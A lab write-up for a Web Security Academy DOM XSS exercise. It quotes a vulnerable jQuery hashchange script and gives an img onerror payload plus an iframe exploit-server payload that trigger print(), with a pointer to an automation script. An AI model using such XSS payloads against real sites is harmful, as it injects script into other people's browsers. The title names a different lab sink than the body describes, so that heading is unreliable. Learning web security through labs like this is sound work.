# XSS LAB 06 - DOM XSS in jQuery anchor href attribute sink using location.search source

## Manual Solution

### 1. Access the Lab
- Navigate to the Web Security Academy lab environment using your browser

### 2. Locate the Vulnerable Script
- Inspect the page source to find this script:
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

### 3. Understanding the Vulnerability
- The script uses `window.location.hash` to read the URL fragment (text after #)
  - `window.location.hash.slice(1)` removes the # character from the beginning
- The script searches for blog post headers containing this text using jQuery's `contains` selector
- When found, it scrolls to that post using `scrollIntoView()`
- This creates an XSS vulnerability because the hash content is not properly sanitized

### 4. Testing the Vulnerability
- Append this XSS payload to the URL:  `#<img src=x onerror=print()>`

### 5. Full Exploitation
- Navigate to the 'Exploit Server' from the lab homepage
- Insert this payload into the body:
  ```html
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
  ```
- Deliver the exploit to complete the lab

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_06.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```





